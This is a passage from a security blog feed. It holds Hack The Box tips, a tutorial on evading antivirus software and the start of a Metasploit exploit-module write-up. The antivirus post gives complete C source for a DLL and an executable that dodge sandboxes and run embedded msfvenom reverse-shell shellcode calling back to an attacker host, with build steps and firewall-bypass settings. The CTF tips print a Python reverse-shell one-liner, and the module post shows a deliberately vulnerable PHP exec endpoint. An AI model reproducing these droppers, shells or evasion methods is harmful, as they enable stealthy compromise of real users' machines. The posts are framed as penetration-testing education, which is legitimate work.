<a href="https://www.rebootuser.com/?p=1623">https://www.rebootuser.com/?p=1623</a><br />
Of course you need to understand how Linux systems work in the first place. Crontab, file system permissions, sudo and all that other basic admin stuff.</p>
<h1>Binary reverse engineering challenges</h1>
<p>In order to reverse binaries in the challenges, you need some knowledge of x86 assembly. The easier ones are not really difficult, but if you can&#8217;t read assembler code, it will be quite hard.<br />
I have tried&nbsp;<a href="https://x64dbg.com/">x64dbg</a>,&nbsp;<a href="https://www.hopperapp.com/">Hopper</a>, <a href="https://rada.re/r/">radare2</a>, <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA (free version)</a> and the good old <a href="http://www.ollydbg.de/version2.html">OllyDbg</a> so far. I also downloaded <a href="https://binary.ninja/">Binary Ninja</a>, but haven&#8217;t really tried it yet. While I don&#8217;t want to debate the merits these tools, I have found x64dbg most to my liking so far. Gives me the same vibes I felt with the ancient Turbo Debugger about 25 years ago.<br />
My strategy so far has been straightforward:<br />
1. Analyze what the program actually does.<br />
2. See if there are interesting strings inside and how they are used.<br />
3. Try to get rid of obfuscation and anti-debugging stuff by rewriting the code.<br />
4. Try to make sense of the remaining final checking code. (single step, breakpoints etc.)<br />
5. Perhaps write a small Python script to reveal the flag.<br />
Some links which might be useful:<br />
<a href="https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2">https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2 </a><a href="https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/">https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/</a><br />
Simply replacing the annoying stuff with NOP instructions is a good starting strategy. If the state of the system (registers and flags) are not affected, this works pretty well.<br />
<img decoding="async" class="alignnone size-full wp-image-1280" src="http://165.232.69.132/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png" alt="radare2" width="1854" height="1002" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png 1854w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-300x162.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1030x557.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-768x415.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1536x830.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1500x811.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-705x381.png 705w" sizes="(max-width: 1854px) 100vw, 1854px" />Get rid of the pesky antidebugging code!</p>
<h1>It&#8217;s not real life</h1>
<p>I have had fun with <strong>Hack the box</strong> (as well as some frustration also), but it has been extremely interesting to peek at what other people are doing on the machines. Here are some of my findings.</p>
<h2>Scripters are running wild</h2>
<p>Here&#8217;s a sample of process list from one of the machines:</p>
<blockquote><p>www-data 2555 0.0 0.3 18904 3604 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
www-data 2556 0.0 0.3 19004 3464 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
www-data 1428 0.0 0.0 4508 704 ? S 10:15 0:00 sh -c cd /tmp; python -c &#8216;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket<br />
.SOCK_STREAM);s.connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);&#8217; 2&gt;&amp;1<br />
www-data 1429 0.0 0.9 39980 9668 ? S 10:15 0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.<br />
connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);<br />
www-data 1430 0.0 0.0 4508 784 ? S 10:15 0:00 /bin/sh -i<br />
www-data 1443 0.0 1.2 256212 12588 ? S 10:15 0:00 /usr/sbin/apache2 -k start<br />
www-data 1493 0.0 0.6 32168 6680 ? S 10:16 0:00 python -c import pty;pty.spawn(&#8220;/bin/bash&#8221;)<br />
www-data 1494 0.0 0.3 18216 3064 pts/3 Ss 10:16 0:00 /bin/bash<br />
www-data 1501 0.0 0.0 4508 752 ? S 10:16 0:00 sh -c cd /tmp; python -c &#8220;import pty; pty.spawn(&#8216;/bin/bash&#8217;)&#8221; 2&gt;&amp;1<br />
www-data 1502 0.0 0.6 32168 6780 ? S 10:16 0:00 python -c import pty; pty.spawn(&#8216;/bin/bash&#8217;)</p></blockquote>
<p>In a real system, this should light up the IDS/SIEM like a christmas tree. Even a cursory look by the administrator with<strong><em> ps -Af</em></strong> would immediately reveal that something bad is happening.<br />
Therefore, in a real pentest (of course neither of us would do any illegal hacking), the tester would run something innocent, like <em>testrunner.sh</em>, which would hide the nefarious activities from immediate discovery. It would be in some obscure innocent folder or completely reside in memory. Most certainly, a professional wouldn&#8217;t upload anything named &#8220;<em>reverse-shell.php</em>&#8221; to the server.<br />
Reverse shells still would show up in network connections unless masquaraded with some network magic, but that process list is just plain funny <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
It&#8217;s quite different also for the reverse engineering. Especially reversing unknown (potential) malware is something I would approach with extreme caution. Just single-stepping and setting breakpoints in a debugger would not be enough to contain a malicious binary.<br />
So if you want to practice for real life scenarios, I would suggest that instead of going straight for the flag, you should practice the same precautions and steps you would need in the real world. Having fun is perfectly fine, nothing wrong with that.</p>
<h1>Don&#8217;t get accidentally exposed!</h1>
<p>As a first step, don&#8217;t hack with your important machine. As a minimum, shut down the VPN when not using it and use a virtual machine (or a burner machine) when you connect to a potentially hostile unknown network.<br />
A lot of people seem to be running <strong><em>python -m SimpleHTTPServer</em></strong>&nbsp;or something similar to host the payloads to be downloaded by the target machine. Please consider that there are other hackers working on the same machine and if you expose your hard disk to the target machine, someone else could download something interesting from your computer. Like, say, your private ssh key. <strong><em>SimpleHTTPServer</em></strong> is super handy, but it does not care about security!<br />
Either work with something which only allows downloading your <em>exploit.exe</em> or immediately shut down the server after your tools have been downloaded on the target.<br />
Here&#8217;s a way to do it with <em><strong>netcat</strong></em>:</p>
<blockquote><p>1. On the target, start listening:<br />
nc -l 8080 &gt; bash.sh<br />
2. On your attacker machine, send your evil payload:<br />
nc -w 3 localhost 8080 &lt; LinEnum.sh</p></blockquote>
<p>Whether this trick works depends on the firewall rules, but as a minimal precaution, shut down your server on your machine immediately after the file transfer.</p>
<h1>Some final tips and ideas</h1>
<h2>Tip 1: Learn Python</h2>
<p>Python is great for quickly cooking up some automation and helper programs. You don&#8217;t need static types or classes to structure your code. But make no mistake: Python is definitely a serious programming language and not just a &#8220;scripting language&#8221;.<br />
Here&#8217;s an example from a script I wrote to automate guessing passwords and users for a certain service.<br />
<img decoding="async" class="alignnone size-full wp-image-1279" src="https://rot.fi/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png" alt="Screen-Shot-2018-03-07-at-14.39.05.png" width="2246" height="1500" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png 2246w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-300x200.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1030x688.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-768x513.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1536x1026.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-2048x1368.png 2048w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1500x1002.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-705x471.png 705w" sizes="(max-width: 2246px) 100vw, 2246px" /></p>
<h2>Tip 2: Keep notes</h2>
<p>Keep notes on the challenges and machines. I have a subfolder for each machine with more or less incoherent notes on what I have found and what I haven&#8217;t yet figured out about the machine. I may put this stuff on a private git repository to get it better organized.</p>
<h2>Tip 3: Use the google</h2>
<p>This is kind of obvious, but enumerate the versions and search for possible exploits in <a href="https://www.exploit-db.com/">exploit-db</a> and other places. I precompiled some exploits already and kept the binary executables in addition to source code. I might need some sort of Excel sheet or something to keep track of these if there are more to come.</p>
<h1>Happy hacking!</h1>
<p>It&#8217;s worth mentioning that <strong>Hack The Box </strong>contains&nbsp;more than just binary reverse engineering and pwning machines.&nbsp;I left out advice for some challenges, like steganography, which I haven&#8217;t really done. I&#8217;m not qualified to give any advice on that.<br />
If you now feel the itch to try out some &#8220;real&#8221; hacking, please do. The best way to learn is by doing and <strong>Hack The Box</strong> is a great platform to practice on.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Evading Antivirus softwares</title>
		<link>/evading-antivirus-softwares/</link>
					<comments>/evading-antivirus-softwares/#respond</comments>
		
		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
		<pubDate>Tue, 18 Apr 2017 19:38:10 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://blog.rot.fi/?p=717</guid>

					<description><![CDATA[As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.
This article should show some ideas about how hackers work.]]></description>
										<content:encoded><![CDATA[<h1 style="text-align: center;">Evading Antivirus softwares</h1>
<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg"><img decoding="async" class="size-full wp-image-786 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg" alt="" width="668" height="193"></a></p>
<h2></h2>
<h2>0x00 General</h2>
<p>Foreword: As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.<br />
This article should show some ideas about how hackers work. Althought I found this myself, there is identical tutorials in the internet and mostly because of that, I&#8217;m writing this. This article covers some basics that are used to bypass the antivirus softwares, but by no means doesn’t cover all means to bypass them. Note: As this is an example, some methods are not as polished as they could be.<br />
Sometimes in penetration testing you may end up with a situation where antivirus software always catches up your payloads. In these cases you need a good way to bypass the antivirus softwares. The method described here is a pretty general, but works with pretty much every antivirus there is.<br />
Method to bypass antivirus detection mentioned here is reported to one antivirus company on February 2016, but from their view, this is more of an undetected malware. As the basic payload is done with msfvenom, one could argue if the payload / method should be detectable by an AV.<br />
The method bypassing antivirus software also evades the sandboxing method. Evasion is as simple as trying to open some file that is sure to exist on every installation, e.g. “<em>c:\windows\system.ini</em>” &#8211; file. If it doesn’t exist, we’re in a sandboxing environment done by antivirus software so we just don’t do anything. When again in a normal environment, file is found and payload is executed.<br />
By&nbsp; sending this method to Virustotal.com, detection rate was 1/59. Virustotal.com is a site, where the service checks the sended file against many antivirus engines. Also, by sending the file there, the antivirus companies get the file as a sample.<br />
Software used:</p>
<ul>
<li>Metasploit (msfvenom, multi/handler)</li>
<li>MinGW</li>
<li>Notepad</li>
</ul>
<h2>0x01 Restrictions / limitations</h2>
<p>It should be noted that the Windows Defender and probably most antivirus softwares nowdays complain about &#8220;some program is trying to connect to internet&#8221;. Of course, in penetration testing situation, this can be a showstopper. Nonetheless, if you manage to get a shell by changing the .dll of some software and/or tricking the user to run the executable, you may easily get a shell from the victim. And it&#8217;s possible to migrate the shellcode to some existing process that already has the access to internet, use&nbsp;existing programs to run malicious code to bypass whitelisting restrictions. There is many available methods to avoid the restrictions.<br />
Of course, there could be some Firewalls/IPS/IDS systems in victims network, but they could also be easily avoided by e.g. using SSL encoded connection back to victim, but that’s another matter and not in scope of this article.<br />
<strong>&nbsp;</strong></p>
<h2>0x02 Setting up the payload</h2>
<p>The payload was generated with ‘<em>msfvenom</em>’ that is part of the Metasploit package. With msfvenom, it’s possible to create executables and dll – files straight out of the box, but since we’re trying to evade the&nbsp; antivirus, we create the payload in C-style output format with the following command:</p>
<pre>msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c</pre>
<p>As can be seen, we are also encoding the payload five times with <em>x86/shikata_ga_nai</em> – encoder, port is <em>4321</em> and destination for payload to contact is <em>10.0.0.8</em>. Our payload is now ready to be used for testing in our code. To bypass IDS/IPS systems, payload using encrypted communications back to attacker could be used. This way even the more advanced firewalls could be bypassed since they can’t decrypt the connection.<br />
<strong>&nbsp;</strong></p>
<h2>0x03 DLL Method</h2>
<p>One method to bypass antivirus softwares can be e.g. to create a malicious .dll – file and replace some existing .dll with it by a number of methods. As usually .exe – files are considered dangerous, users normally don’t recognize .dll – files as malicious. For testing purposes, this code snippet is just a very crude .dll – file that can be run from command line and doesn’t have any other functionality.</p>
<pre>#include
#include
#ifdef EXPORTING_DLL
  extern __declspec(dllexport) void Checksandboxing() ;
#else
  extern __declspec(dllimport) void Checksandboxing() ;
#endif
extern "C" BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpvReserved
) {
switch(fdwReason) {
    case DLL_PROCESS_ATTACH:
         CheckSandboxing();
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    default:
        break;
    }
return TRUE;
}
void CheckSandboxing()
{
  /** Test for some existing system file, sandbox evasion **/
  std::ifstream dllfile("c:\\windows\\system.ini", std::ios::binary);
  if (!dllfile)
  {
       MessageBox( NULL, TEXT("Running in sandbox"), TEXT("Sandbox"), MB_OK);
  }
  else
  {
       MessageBox( NULL, TEXT("Real system, running exploit"), TEXT("Real"), MB_OK);
    /** msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c  **/
    unsigned char shellcode[] =
    "\xbd\xf8\x13\x49\xa2\xda\xcf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
    "\x6f\x83\xc2\x04\x31\x6a\x0f\x03\x6a\xf7\xf1\xbc\x19\x44\xae"
    "\x68\x86\x91\x90\x4c\x42\x01\xd9\x32\x82\x80\x90\xa5\xe5\x4f"
    "\xc7\x36\x5b\x7b\x64\xfd\x67\x22\xc7\x73\x73\xbb\xf3\x22\x3e"
    "\x09\x29\x81\x17\x8d\xb9\x87\x1f\xd4\x8c\x23\xc9\x65\x07\xc9"
    "\xc0\xd9\x46\x6d\xe3\xff\x34\x31\x74\xa7\x67\xec\x23\xb4\x53"
    "\x83\x31\xbe\x71\xda\x48\x30\x28\x16\x1e\xb9\x5e\x50\xa5\xf0"
    "\xe7\x80\x07\x07\x04\x91\xab\xfc\x2b\xd1\x74\xcd\x3d\x11\x7e"
    "\x77\xf5\x4b\xd4\x6a\x9f\x2d\xec\x28\x72\xd6\xa7\x87\x56\x97"
    "\x89\xe1\x2b\x46\x72\x04\x56\x23\xd2\x17\x96\x62\x85\x7c\xd0"
    "\x9e\xe8\x24\x92\x59\x3f\x58\x3e\xf4\x66\xf0\xdf\x56\xf0\xf0"
    "\x72\x96\x21\xae\xb7\x9c\x26\x33\x7d\x11\xec\x14\x44\x0c\xb9"
    "\x0d\x50\xca\xb6\xf6\xb3\xab\xd7\x93\x6d\xfb\xe9\x20\x6b\x0f"
    "\xf4\xda\x61\xb3\xed\x40\xf9\xea\xcc\xba\xd4\x92\xbe\x15\x11"
    "\xe4\xba\x22\xdc\x43\xb7\x15\xeb\x5d\x45\x79\x41\xa5\x25\xe7"
    "\x8e\xa2\x8e\x97\x7d\xae\xf4\x1e\x50\x22\x4c\xb7\xfc\x08\x21"
    "\xed\xb4\x1d\xde\xff\x1a\x7a\x37\x98\xa3\xcd\x47\xfa\x10\x1a"
    "\xff\x57\x52\x6c\xff\x39\x92\xe6\x53\x05\x67\xd9\xcf\x51\x01"
    "\x4f\x0c\x18\x66\x81\x4a\x02\x2d\x79\xe5\x0c\x80\xe3\xe4\xce"
    "\x61\x18\xc2\x9c\xc8\xe5\xda\x31\xad\x2b\x63\xe3\xae\xf2\x81"
    "\xd0\x0d\x26\xd9\xe5\x64\x73\x8a\x70\x71\x2f\x88\x4c\x72\xba"
    "\xef\xd5\x26\x39\x2c\x42\xe6\xd9\x93\xb7\x69\xd9\x49\xcd\x72"
    "\x10\x52\x1e\x76\x11\xb5\xa9\x6c\xc7\x45\xcc\xa9\xf0\x83\x75"
    "\xa7\x85\xcb\x34\x0a\x50\x1d\xf5\xe5\x6c\xbc\x88\xda\xe1\x0f"
    "\xa9\xe8\xe8\xf0\xc4\x1e\x83\xa1\xdf\xad\xaa\x9f\x1d\xa7\x82"
    "\x71\x6c\xbd\x8b\x02\x6d\x54\xf7\x42\xae\x68\x24\x9f\xf8\x73"
    "\xb9\x8a\x67\xa6\xef\x32\xdf\x21\xf2\x9a\xea\x10\xc6\x19\xcf"
    "\x11\x55\x61\xfc\xfe\xf1\x51\x49\xbc\x04\x9f\xe0\x9a\x09\x4e"
    "\x19\x2f\xb1\x20\x76\xac\x90\x3d\x48\x2b\x24\x23\xa6\xa1\x2e"
    "\x85\x35\xf7\x47\x8f\x49\xa3\xa0\x7a\x65\x22\x17\x5d\x72\x31"
    "\xb3\x2e\x38\xdf\xe7\xea\x83\xdd\xdf\xdd\x9c\xdb\x5a\x46\x4d"
    "\xd3\xa0\x31";
    LPVOID lpAlloc = NULL;
    void (*shellfunc)();
    /** Allocate memory for shellcode (read,write,execute) **/
    lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(lpAlloc == NULL)
    {
        printf("Error allocating memory!\n");
    }
    else
    {
        memcpy(lpAlloc, shellcode, lstrlenA((LPCSTR)shellcode)+1);
        shellfunc = (void (*)())lpAlloc;
        shellfunc();
    }
    /** Sleep for a bit **/
    Sleep(500);
  }
}
</pre>
<p>Compilation of the .dll is done as follows with MinGW</p>
<pre>"c:\MinGW\bin\mingw32-g++.exe" -c c:\dll_test\main.cpp
"c:\MinGW\bin\mingw32-g++.exe" -shared -o exploittest.dll main.o -Wl,--out-implib,libexample_dll.a
</pre>
<p>Now the .dll can be checked with antivirus software, checking with Virustotal.com:<br />
<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png"><img decoding="async" class="size-full wp-image-795 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png" alt="" width="960" height="273"></a><br />
Not detected by any (0/60) antivirus software at virustotal.com.<br />
Now, to test the exploit, we first would setup a meterpreter multi/handler to wait for the connection:<br />
And now we can run the payload from the exploit with following command on the command line:</p>
<pre>Rundll32 exploittest.dll,@DllMain
</pre>
<p>What happens next, is Windows Defender or antivirus software will popup a question that ‘<em>exploittest.dll wants to connect to internet…</em>’, if it is accepted, shellcode inside .dll connects back to the attacker and shell is now made! Of course, in real situation this is a showstopper, but shell isn’t the only thing that can be placed inside the .dll – file.</p>
<h2>0x04 Executables</h2>
<p>As with the .dll – file, sandbox evasion is done by first checking for some existing system file. If file is found, code execution is moved to the payload.<br />
Code:</p>
<pre>#include
// msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c
char code[] =
"\xdb\xda\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\xcd\x9f\x5f\xe9\xb1"
"\x6f\x31\x46\x18\x83\xee\xfc\x03\x46\xd9\x7d\xaa\x34\x23\x58"
"\x21\xe3\x57\x06\x74\x2d\xf6\x97\x42\x9b\x31\x56\x3a\xed\xb4"
"\x80\x38\xc8\x32\xb0\x4b\xc6\x1e\x22\x25\xdb\xc1\xd8\x32\x06"
"\xc8\x19\x31\x8f\x0f\x09\x7c\xf8\x63\x78\x9d\x37\x00\x37\x86"
"\x02\xf6\x63\xe6\x8b\xfc\xc1\xba\x1a\x88\x74\x60\xed\xc0\xad"
"\x2a\x5b\xf2\xd3\x80\x19\xa9\x0e\x2e\x0c\x88\x36\xcf\xdb\x27"
"\x84\x06\xbf\x25\x91\x64\x09\x1d\xf1\x19\x2f\xd6\xa2\x6d\x6d"
"\x2a\x4e\xeb\xa4\x00\x91\x35\x57\x28\xbd\xd6\x10\x13\xad\x5d"
"\xea\x23\x25\x9d\x14\x11\xc5\x8e\x8e\x46\x7b\x28\xe1\x3b\xf3"
"\xd2\x4e\x39\xf0\x5d\x4a\xce\x64\xa7\x82\xc2\x7f\x72\x34\x96"
"\xb4\xf9\x8d\xfe\x94\x11\x37\x88\xc3\xd7\xcb\xb5\x37\xb3\x1c"
"\xc2\x58\xcc\x08\x37\x35\xea\x67\xff\x97\x01\x92\xf8\x33\x82"
"\x5d\x3e\x48\xff\xe3\x96\x75\x18\x95\xcf\xc4\x07\xe5\xa4\x73"
"\x38\xd4\x21\xe1\xb4\x96\x40\x52\x76\xdf\xe1\x60\x2c\xaf\x5d"
"\xb3\xe4\xff\x89\x6b\x49\x3e\x7e\x2d\x0b\x33\xa0\x54\x8d\x9b"
"\x40\x5b\x2e\xfe\x62\x1f\x48\x21\x69\x6e\x99\x08\xc2\xc2\xc3"
"\x69\x53\x3f\x84\x8e\x79\xdb\xca\xeb\x3f\xcf\xd8\x8c\xf8\x0a"
"\xed\x59\xcb\x6e\x82\xb4\x07\x00\xc3\x13\xed\x2e\x67\xf5\xc8"
"\xfd\x1c\x24\x6a\x95\x3d\x90\x43\x29\xba\x29\xff\x22\x2b\x48"
"\xa7\x7d\xb0\x3d\x56\x71\x30\x95\xdd\x69\x51\x2e\x0f\x3d\x5d"
"\x19\xbd\xfa\x06\xf9\x02\xfd\xed\x08\x27\xb8\x21\x11\xd7\xc4"
"\xd5\xca\xbb\x2a\xd4\xe7\x64\x65\x81\x50\x7b\xbd\xbd\xcb\xc0"
"\x15\x05\xff\x78\xee\x8b\x38\x2b\x28\x52\x56\xb2\x49\xc4\x44"
"\x39\xba\x76\x84\xeb\x0d\xa4\x53\x38\x4e\x77\x05\xc4\xa7\x94"
"\xd4\xe9\xbf\x1d\xb7\xc1\x6f\x5f\xa6\x62\xe4\x91\x48\x3c\xd4"
"\x6e\xce\xf1\x5f\xfd\x6c\x52\x8c\x59\x5c\x71\x63\x30\x81\x2e"
"\x63\x6f\xbc\x43\x0b\xab\x37\xdb\xbf\x48\x22\xda\xdb\x3d\x04"
"\xab\x5b\x6e\xfd\x3e\xfb\xfe\xb8\x4b\xa8\x72\xeb\x71\xbb\x0a"
"\xeb\xb2\x56\xcb\xb9\x14\xcf\x7a\xa5\xc3\x5d\x34\x4f\xfa\x55"
"\x54\x9d\x10\xe5\x26\xbc\x61\x56\xc7\x79\x8d\x64\x7a\x06\x50"
"\x07\xdd\xc6";
int main(int argc, char **argv)
{
  FILE *fp = fopen("c:\\windows\\system.ini", "rb");
  if (fp == NULL)
  return 0;
  fclose(fp);
  printf("Launching...again...");
  int (*func)();
  func = (int (*)()) code;
  return 0;
  (int)(*func)();
  printf("...DONE!");
}
</pre>
<p>Compilation is done simply by issuing:</p>
<pre>c:\MinGW\bin\mingw32-gcc.exe exploittest.c -o exploittest.exe
</pre>
<p>Afterwards checking with virustotal.com, only <em>Baidu</em> noticed that it is a Trojan. Note to myself: Have to check why Baidu finds this.<br />
<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png"><img decoding="async" class="size-full wp-image-796 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png" alt="" width="966" height="413"></a><br />
To test this, a multi/handler could be setup as in <strong>x03 DLL Method</strong> (note, different payload) and by simply executing the file. Same nagging from Windows defender and/or antivirus software apply to this also.</p>
<h2>0x05 Malicious payloads through IPS / IDS systems</h2>
<p>In case there is IPS / IDS systems in front of the victim, these files should pass right through them, but they payloads would get caught. If actual files would get caught, just create a password protected .zip – file and get the files through HTTP for example. So, something like <em>windows/meterpreter/reverse_https</em> could be used as payload with following changes to parameters:</p>
<ul>
<li>EnableStageEncoding true</li>
<li>MeterpreterServerName Nginx</li>
<li>MeterpreterUserAgent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36</li>
<li>StageEncoder (one of the below)
<ul>
<li>x86/fnstenv_mov</li>
<li>x86/shikata_ga_nai</li>
</ul>
</li>
</ul>
<p>With these changes, it’s possible to walk through the firewalls with IPS/IDS systems enabled. One thing I noticed with one major firewall manufacturer is that it blocks SSL encrypted payloads, but after fiddling with ‘<em>stdapi_sys_process_execute</em>’ – string, the shell goes through, but issues ‘<em>critical</em>’ – state in the lofugs. As I went through the firewall, I didn’t research it more. I would wager that it is very well possible to completely hide from the firewall.<br />
Of course, if all else fails, there is always the dnscat… <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
<strong>&nbsp;</strong></p>
<h2>0x06 Conclusion</h2>
<p>Since victim would get an exploit/Trojan that is undetected by antivirus softwares, the possibility of exploiting unsuspecting user is greatly enhanced. Of course Windows Defender and antivirus have restrictions against new connections, but sadly these messages are ignored very often. But since antivirus doesn’t find anything, it is safe yes? No. Much of the security is still on the shoulders of users and antivirus / firewalls / IPS / IDS can’t be trusted to be bulletproof.<br />
These methods could be further developed to do more evasive actions, sleep for a time, write other programs, etc. etc. This article was all about getting a shell from the client, but payload could be e.g. something more malicious. So, be sure not to count on the security software you use, have a common sense. Have a multiple layers of defense to enhance your security.</p>
]]></content:encoded>
					
					<wfw:commentRss>/evading-antivirus-softwares/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Development &#8211; Metasploit modules for fun &#038; profit</title>
		<link>/how-to-metasploit-exploit-development/</link>
					<comments>/how-to-metasploit-exploit-development/#respond</comments>
		
		<dc:creator><![CDATA[j3k]]></dc:creator>
		<pubDate>Thu, 16 Feb 2017 21:18:21 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://blog.rot.fi/?p=247</guid>

					<description><![CDATA[Lets go through an exploit module I built for Metasploit Framework.
In a nutshell, the exploit contains only a couple of key elements - a HTTP Client and Server and a generated malicious payload.
I needed an easy way to abuse a Remote Command Execution vulnerability. A full exploit module that would generate the selected payload and return a meterpreter reverse shell back to me. All in one go.]]></description>
										<content:encoded><![CDATA[<p>Lets go through an exploit module I built for Metasploit Framework.<br />
In a nutshell, the exploit contains only a couple of key elements &#8211; a HTTP Client and Server and a generated malicious payload.<br />
I needed an easy way to abuse a <em>Remote Command Execution</em> vulnerability. A&nbsp;full exploit module that would generate the selected payload and return a meterpreter reverse shell back to me. All in one go.<br />
Generally, exploit development is much more time consuming &#8211; and sometimes even more difficult &#8211; than just &#8220;triggering&#8221; the found vulnerability with a HTTP Request for instance.<br />
What this exploit module does, is it exploits a <em>RCE</em> vulnerability via a malicious <em>HTTP GET</em> request.<br />
Whats required from the victim, is that a linux &#8216;<em>wget&#8217;</em> tool is installed, which is very common. &nbsp; &nbsp;&#8230; and of course that there is a RCE vulnerability that allows the attacker to run shell commands.<br />
Here is an example of PHP Code that would create such a vulnerability.</p>
<pre><em>https://rot.fi/vulnerable_url.php:
&nbsp;&lt;?php exec($_GET['cmd']); ?&gt;</em></pre>
<p>You would simple call this URL by <em><strong>https://rot.fi/vulnerable_url.php?cmd=hostname</strong></em><br />
and that would result the backend webserver to run this the supplied command &#8216;hostname&#8217;. You wouldn&#8217;t see the result on page, as it is not printed on it.<br />
I&#8217;ll break down the module and try to explain each part of it.</p>
<h1>Foundations()</h1>
<p>In order to get this module working, we need to define that it&#8217;s a Metasploit <span style="text-decoration: underline;">Exploit</span> Module, and include the required libraries.<br />
To define a module type, you define it in the <strong>class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit.</strong><br />
For an auxiliary module, you would use <strong>class MetasploitModule &lt; Msf::Auxiliary</strong></p>
<blockquote>
<div class="codebox">require&nbsp;&#8216;msf/core&#8217;<br />
class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit<br />
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span><br />
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span><br />
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML</span></div>
</blockquote>
<h1><span style="color: #0000ff;"><span style="color: #333333;">OnesAndZeros()</span></span></h1>
<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span>, is what you need to generate a binary payload.<br />
This guy is essential to our specific need to respond to a <em>HTTP GET</em> request with a file that&#8217;s loaded with goodies.</p>
<h1>TriggerVuln()</h1>
